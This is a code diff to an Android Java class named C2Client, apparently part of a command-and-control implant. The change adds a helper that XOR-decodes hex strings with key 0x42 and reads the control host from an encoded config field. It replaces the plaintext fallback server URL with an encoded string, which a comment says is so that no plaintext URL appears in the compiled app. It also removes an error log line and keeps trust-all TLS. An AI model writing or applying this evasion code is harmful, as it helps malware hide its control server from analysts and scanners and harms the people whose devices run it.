@@ -28,7 +28,7 @@ public class C2Client {
     private final String authKey;
     private final boolean trustAll;
 
-    /** Load config from assets/config.json. */
+    /** Load config from assets/config.json. Host is XOR-encoded in host_xor field. */
     public static C2Client fromAssets(android.content.Context ctx) {
         try {
             java.io.InputStream is = ctx.getAssets().open("config.json");
@@ -36,15 +36,25 @@ public class C2Client {
             is.read(buf);
             is.close();
             String json = new String(buf, "UTF-8");
-            String host     = extractJson(json, "host");
-            String auth     = extractJson(json, "auth");
+            // Prefer decoded host_xor over plaintext host
+            String hostEnc = extractJson(json, "host_xor");
+            String host    = hostEnc.isEmpty() ? extractJson(json, "host") : d(hostEnc);
+            String auth    = extractJson(json, "auth");
             String trustStr = extractJson(json, "trust_all");
-            boolean trust   = !"false".equalsIgnoreCase(trustStr);
+            boolean trust  = !"false".equalsIgnoreCase(trustStr);
             return new C2Client(host, auth, trust);
         } catch (Exception e) {
-            Log.e(TAG, "config.json load failed, using fallback", e);
-            return new C2Client("https://192.168.1.1:4444", "changeme", true);
+            // Fallback: "https://192.168.1.1:4444" XOR 0x42 — no plaintext URL in DEX
+            return new C2Client(d("2a36363231786d6d737b706c73747a6c736c737876767676"), "changeme", true);
         }
+    }
+
+    private static String d(String h) {
+        byte[] out = new byte[h.length() / 2];
+        for (int i = 0; i < out.length; i++) {
+            out[i] = (byte) (Integer.parseInt(h.substring(i * 2, i * 2 + 2), 16) ^ 0x42);
+        }
+        return new String(out, StandardCharsets.UTF_8);
     }
 
     private static String extractJson(String json, String key) {
